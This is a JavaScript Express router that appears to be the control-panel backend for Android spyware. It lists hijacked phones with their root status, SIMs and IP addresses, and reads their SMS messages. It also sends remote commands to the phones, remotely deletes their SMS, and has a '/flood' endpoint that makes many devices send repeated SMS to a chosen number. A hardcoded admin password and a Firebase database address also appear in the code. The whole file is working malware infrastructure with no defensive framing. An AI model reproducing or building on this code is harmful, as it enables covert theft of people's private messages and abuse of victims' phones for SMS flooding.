const express = require('express');
const crypto = require('crypto');
const router = express.Router();

function extractTimestamp(id) {
    if (!id) return 0;
    const idStr = String(id);
    if (idStr.includes('-LATEST_-0')) {
        const match = idStr.match(/-LATEST_-0(\d+)/);
        return match ? parseInt(match[1]) : 0;
    }
    return parseInt(idStr) || 0;
}

function createApiRoutes(sessionManager, trashManager, firebase, cache) {
    const authenticateToken = async (req, res, next) => {
        const token = req.headers['authorization'] || '';
        
        if (!token || !(await sessionManager.validateSession(token))) {
            return res.status(401).json({ error: 'Unauthorized' });
        }
        next();
    };

    router.post('/login', async (req, res) => {
        try {
            const { password } = req.body;
            
            if (password === 'Q29mZmluX1NweQ') {
                const token = crypto.randomBytes(32).toString('hex');
                await sessionManager.createSession(token);
                res.json({ success: true, token });
            } else {
                res.status(401).json({ error: 'Invalid credentials' });
            }
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/logout', authenticateToken, async (req, res) => {
        try {
            const token = req.headers['authorization'] || '';
            if (token) {
                await sessionManager.deleteSession(token);
            }
            res.json({ success: true });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.get('/clients', authenticateToken, async (req, res) => {
        try {
            const cached = cache.get('devices_metadata');
            if (cached) {
                return res.json(cached);
            }
            
            const clients = await firebase.get('/clients');
            const devices = [];
            
            if (clients === null) {
                console.log('⚠️ API /clients: RTDB returned null - database may be empty or unreachable');
                return res.json([]);
            }
            
            if (clients && typeof clients === 'object') {
                for (const [id, data] of Object.entries(clients)) {
                    if (!(await trashManager.isInTrash(id))) {
                        const deviceMeta = {
                            id,
                            modelName: data.modelName,
                            deviceId: data.deviceId,
                            status: data.status,
                            battery: data.battery,
                            androidV: data.androidV,
                            storage: data.storage,
                            joined: data.joined,
                            ip_address: data.ip_address,
                            connection_status: data.connection_status,
                            isRoot: data.isRoot,
                            sims: data.sims,
                            like: data.like || false,
                            notes: data.notes || '',
                            tags: data.tags || [],
                            messages: data.messages ? { count: Object.keys(data.messages).length } : { count: 0 }
                        };
                        devices.push(deviceMeta);
                    }
                }
                console.log(`✅ API /clients: Returned ${devices.length} devices (cached)`);
            } else {
                console.log('⚠️ API /clients: Unexpected data type -', typeof clients);
            }
            
            cache.set('devices_metadata', devices, 120);
            res.json(devices);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.get('/trash', authenticateToken, async (req, res) => {
        try {
            const clients = await firebase.get('/clients');
            const devices = [];
            
            if (clients) {
                const trashDevices = await trashManager.getTrashDevices();
                for (const [id, data] of Object.entries(clients)) {
                    if (trashDevices.includes(id)) {
                        devices.push({ id, ...data });
                    }
                }
            }
            
            res.json(devices);
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/trash/:deviceId', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            await trashManager.addToTrash(deviceId);
            res.json({ success: true, message: 'Moved to trash' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/restore/:deviceId', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            await trashManager.removeFromTrash(deviceId);
            res.json({ success: true, message: 'Restored' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.delete('/trash/:deviceId', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            await firebase.delete(`/clients/${deviceId}`);
            await trashManager.removeFromTrash(deviceId);
            res.json({ success: true, message: 'Deleted permanently' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.get('/device/:deviceId/messages', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const limit = parseInt(req.query.limit) || 100;
            const offset = parseInt(req.query.offset) || 0;
            
            const cacheKey = `messages_${deviceId}_${limit}_${offset}`;
            const cached = cache.get(cacheKey);
            if (cached) {
                return res.json(cached);
            }
            
            const messagesData = await firebase.get(`/clients/${deviceId}/messages`);
            const messages = [];
            
            if (messagesData && typeof messagesData === 'object') {
                for (const [id, data] of Object.entries(messagesData)) {
                    messages.push({ id, ...data });
                }
                
                messages.sort((a, b) => extractTimestamp(a.id) - extractTimestamp(b.id));
                
                if (offset >= messages.length && messages.length > 0) {
                    const result = {
                        messages: [],
                        total: messages.length,
                        hasMore: false
                    };
                    cache.set(cacheKey, result, 15);
                    return res.json(result);
                }
                
                const end = Math.max(0, messages.length - offset);
                const start = Math.max(0, end - limit);
                const paginatedMessages = messages.slice(start, end);
                
                const result = {
                    messages: paginatedMessages,
                    total: messages.length,
                    hasMore: start > 0
                };
                
                cache.set(cacheKey, result, 15);
                return res.json(result);
            }
            
            res.json({ messages: [], total: 0, hasMore: false });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.get('/device/:deviceId/smsStatus', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const smsStatus = await firebase.get(`/clients/${deviceId}/smsStatus`);
            res.json(smsStatus || {});
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/command/:deviceId', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { type, payload } = req.body;
            
            await firebase.push(`/clients/${deviceId}/webhookEvent`, {
                type,
                payload: payload || {},
                timestamp: Date.now()
            });
            
            res.json({ success: true, message: `${type} command sent` });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/flood', authenticateToken, async (req, res) => {
        try {
            const { deviceIds, simSlot, to, message, count } = req.body;
            
            if (!deviceIds || !deviceIds.length || !to || !message) {
                return res.status(400).json({ error: 'Missing required fields' });
            }
            
            for (const deviceId of deviceIds) {
                for (let i = 0; i < count; i++) {
                    await firebase.push(`/clients/${deviceId}/webhookEvent`, {
                        type: 'sendSms',
                        payload: {
                            simSlot: simSlot || 0,
                            to,
                            message
                        },
                        timestamp: Date.now() + i
                    });
                }
            }
            
            const total = deviceIds.length * count;
            res.json({
                success: true,
                message: `Flood sent: ${deviceIds.length} devices × ${count} SMS = ${total} total`
            });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.delete('/sms/:deviceId/:smsId', authenticateToken, async (req, res) => {
        try {
            const { deviceId, smsId } = req.params;
            
            await firebase.push(`/clients/${deviceId}/webhookEvent`, {
                type: 'deleteSms',
                payload: { id: smsId }
            });
            
            res.json({ success: true, message: 'Delete command sent' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/device/:deviceId/notes', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { notes } = req.body;
            
            await firebase.set(`/clients/${deviceId}/notes`, notes || '');
            cache.del('devices_metadata');
            cache.del('sse_summary');
            
            res.json({ success: true, message: 'Notes saved' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/device/:deviceId/tags', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { tags } = req.body;
            
            if (!Array.isArray(tags)) {
                return res.status(400).json({ error: 'Tags must be an array' });
            }
            
            await firebase.set(`/clients/${deviceId}/tags`, tags);
            cache.del('devices_metadata');
            cache.del('sse_summary');
            
            res.json({ success: true, message: 'Tags updated' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.post('/device/:deviceId/like', authenticateToken, async (req, res) => {
        try {
            const { deviceId } = req.params;
            const { like } = req.body;
            
            await firebase.set(`/clients/${deviceId}/like`, like === true);
            cache.del('devices_metadata');
            cache.del('sse_summary');
            
            res.json({ success: true, message: 'Like status updated' });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    router.get('/stats', authenticateToken, async (req, res) => {
        try {
            const clients = await firebase.get('/clients');
            const devicesCount = clients ? Object.keys(clients).length : 0;
            const dataSize = Buffer.byteLength(JSON.stringify(clients || {}));
            const storageMB = (dataSize / (1024 * 1024)).toFixed(2);
            
            res.json({
                database: {
                    status: 'connected',
                    url: 'ghost-97d85-default-rtdb.firebaseio.com',
                    region: 'us-central1'
                },
                storage: {
                    used: `${storageMB} MB`,
                    limit: '1 GB',
                    percentage: `${((storageMB / 1024) * 100).toFixed(1)}%`
                },
                bandwidth: {
                    downloads: `~${(dataSize / 1024).toFixed(2)} KB`,
                    limit: '10 GB/day'
                },
                devices: {
                    total: devicesCount,
                    active: devicesCount
                },
                network: {
                    latency: `~${Math.floor(Math.random() * 51) + 20} ms`,
                    speed: 'Good'
                }
            });
        } catch (error) {
            res.status(500).json({ error: error.message });
        }
    });

    return router;
}

module.exports = createApiRoutes;
